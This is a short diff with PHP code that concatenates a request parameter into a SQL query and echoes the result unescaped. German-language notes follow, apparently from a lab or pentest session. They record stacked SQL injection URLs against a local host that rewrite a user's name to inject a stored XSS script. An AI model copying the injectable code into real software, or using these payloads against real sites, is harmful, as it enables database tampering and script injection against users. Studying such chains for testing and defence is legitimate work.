@@ -1,0 +1,16 @@
+$res = $db->query("SELECT name FROM Users WHERE id = ". $_REQUEST['id'])->fetch(PDO::FETCH_ASSOC); 
+echo "Willkommen". $res['name'] ." <a href='/delete'>(Account löschen)</a>";
+
+
+!!!!!!
+UPDATE XSS evtl doch möglich !!!
+teil des Payloads im Frontend zu sehen!
+http://192.168.2.110:8080/?id=1;%20UPDATE%20users%20SET%20name=%27neuer_name%27%20WHERE%20id=1--
+dann nochmal mit id=1 aufrufen....
+
+kein alert
+http://192.168.2.110:8080/?id=1;%20UPDATE%20users%20SET%20name=%27%3C/a%3E%3C/h2%3E%3Cscript%3Ealert(1)%3Cscript%3E--%20-%27%20WHERE%20id=1--
+frontend inspezieren
+
+syntax fehler XSS entry gefunden!!!!! 
+http://192.168.2.110:8080/?id=1;%20UPDATE%20users%20SET%20name=%27%3C/a%3E%3C/h2%3E%3Cscript%3Ealert(1)%3C/script%3E--%20-%27%20WHERE%20id=1--
